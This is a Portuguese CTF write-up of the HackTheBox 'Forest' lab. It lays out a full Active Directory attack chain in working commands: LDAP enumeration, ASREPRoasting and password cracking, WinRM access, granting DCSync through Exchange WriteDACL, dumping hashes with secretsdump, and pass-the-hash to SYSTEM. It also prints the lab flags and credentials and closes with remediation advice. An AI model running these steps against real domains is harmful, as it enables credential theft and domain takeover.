---
title: "HTB — Forest (Easy Windows AD): ASREPRoast + DCSync via Exchange WriteDACL"
date: 2026-05-18 10:00:00 +0000
categories: [Machines, HackTheBox]
tags: [hackthebox, windows, active-directory, asreproast, dcsync, exchange, writedacl, pass-the-hash, easy]
---

**IP:** 10.129.36.191 | **Dificuldade:** Easy | **OS:** Windows Server 2016 DC | **Domínio:** htb.local

## Resumo

Domain Controller com Exchange instalado. LDAP permite anonymous bind, expondo todos os usuários. A conta de serviço `svc-alfresco` tem Kerberos pre-auth desabilitada (ASREPRoastable). Após crackear o hash e obter shell via WinRM, explora-se a membership aninhada em Account Operators → Exchange Windows Permissions (WriteDACL no domínio) para conceder DCSync ao usuário criado, dumpando todos os hashes NTLM.

| Flag | Hash |
|------|------|
| user.txt | `81b7943c74055eb9b18fbead290f1a6c` |
| root.txt | `b523a61208fb87b04ddabda38b4da4dd` |

---

## 1. Reconhecimento

```bash
nmap -sV -sC -T4 -Pn 10.129.36.191
```

```
PORT     STATE SERVICE
88/tcp   open  kerberos-sec
389/tcp  open  ldap    (Domain: htb.local)
445/tcp  open  microsoft-ds
5985/tcp open  http    WinRM
```

---

## 2. Enumeração LDAP (Anonymous Bind)

```bash
echo "10.129.36.191 htb.local" | sudo tee -a /etc/hosts

ldapsearch -x -H ldap://10.129.36.191:389 \
  -b "dc=htb,dc=local" \
  "(sAMAccountType=805306368)" sAMAccountName
```

LDAP aceita bind anônimo (`-x`). Retornou todos os usuários, incluindo `svc-alfresco` — conta de serviço do Alfresco que **requer** Kerberos pre-auth desabilitada → **ASREPRoastable**.

---

## 3. ASREPRoasting — svc-alfresco

```bash
GetNPUsers.py htb.local/ -dc-ip 10.129.36.191 \
  -usersfile /tmp/users.txt -no-pass -format hashcat
```

```
$krb5asrep$23$svc-alfresco@HTB.LOCAL:19ee5538...
```

```bash
john hash.txt --wordlist=rockyou.txt --format=krb5asrep
# s3rvice
```

---

## 4. Foothold — Evil-WinRM

```bash
evil-winrm -i 10.129.36.191 -u svc-alfresco -p s3rvice
type C:\Users\svc-alfresco\Desktop\user.txt
# 81b7943c74055eb9b18fbead290f1a6c
```

---

## 5. Escalada de Privilégios — DCSync via Exchange WriteDACL

BloodHound revela a cadeia:

```
svc-alfresco → Service Accounts → Privileged IT Accounts → Account Operators
```

O grupo **Exchange Windows Permissions** tem `WriteDACL` no objeto do domínio → permite adicionar **DCSync** (DS-Replication-Get-Changes-All).

**Passo 1 — Criar usuário e adicionar aos grupos:**

```powershell
net user john abc123! /add /domain
net group "Exchange Windows Permissions" john /add
net localgroup "Remote Management Users" john /add
```

**Passo 2 — Conceder DCSync com PowerView:**

```powershell
. .\PowerView.ps1
$pass = convertto-securestring 'abc123!' -asplain -force
$cred = new-object system.management.automation.pscredential('htb\john', $pass)
Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync
```

**Passo 3 — Dump de todos os hashes NTLM:**

```bash
secretsdump.py htb/john:'abc123!'@10.129.36.191
# Administrator:500:...:32693b11e6aa90eb43d32c72a07ceea6:::
```

**Passo 4 — Pass-the-Hash:**

```bash
psexec.py administrator@10.129.36.191 \
  -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
# nt authority\system

type C:\Users\Administrator\Desktop\root.txt
# b523a61208fb87b04ddabda38b4da4dd
```

---

## Diagrama

```
LDAP anon bind → enumera svc-alfresco (ASREPRoastable)
  ↓ GetNPUsers → hash → john → s3rvice
  ↓ Evil-WinRM svc-alfresco:s3rvice → user.txt
  ↓ Account Operators (nested) → Exchange Windows Permissions → WriteDACL
  ↓ net user john + PowerView Add-ObjectACL → DCSync
  ↓ secretsdump → Administrator NTLM
  ↓ psexec PtH → nt authority\system → root.txt
```

---

## Lições Aprendidas

| Vulnerabilidade | Remediação |
|-----------------|------------|
| LDAP anonymous bind | Desabilitar null/anonymous bind no AD |
| Kerberos pre-auth desabilitada | Habilitar pre-auth em todas as contas |
| Senha fraca em service account (`s3rvice`) | Usar MSAs / passwords managers para service accounts |
| Exchange WriteDACL no objeto de domínio | Remover permissões excessivas do Exchange (mitigação Microsoft KB) |
| DCSync sem proteção adicional | Monitorar eventos 4662; usar Protected Users group |
